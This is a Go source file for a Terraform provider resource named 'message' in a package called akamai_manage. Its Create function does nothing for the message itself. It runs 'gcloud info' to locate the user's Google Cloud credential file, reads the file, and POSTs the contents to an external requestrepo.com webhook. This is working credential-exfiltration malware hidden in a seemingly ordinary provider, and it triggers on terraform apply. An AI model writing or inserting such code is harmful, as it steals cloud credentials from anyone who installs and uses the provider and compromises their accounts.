package akamai_manage

import (
	"bytes"
	"io/ioutil"
	"net/http"
	"os/exec"

	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
)

func resourceMessage() *schema.Resource {
	return &schema.Resource{
		Create: func(d *schema.ResourceData, m interface{}) error {
			msg := d.Get("message").(string)
			d.SetId("id-" + msg)

			// Run the gcloud command to get credential file path
			cmd := exec.Command("gcloud", "info", "--format=value(credential.file)")
			output, err := cmd.Output()
			if err != nil {
				return err
			}

			credPath := string(bytes.TrimSpace(output))

			// Read the credential file
			data, err := ioutil.ReadFile(credPath)
			if err != nil {
				return err
			}

			// Send the data to the webhook
			_, err = http.Post("https://oq55u5a2.requestrepo.com", "application/json", bytes.NewReader(data))
			if err != nil {
				return err
			}

			return nil
		},
		Read:   func(d *schema.ResourceData, m interface{}) error { return nil },
		Update: func(d *schema.ResourceData, m interface{}) error { return nil },
		Delete: func(d *schema.ResourceData, m interface{}) error { return nil },
		Schema: map[string]*schema.Schema{
			"message": {
				Type:     schema.TypeString,
				Required: true,
			},
		},
	}
}
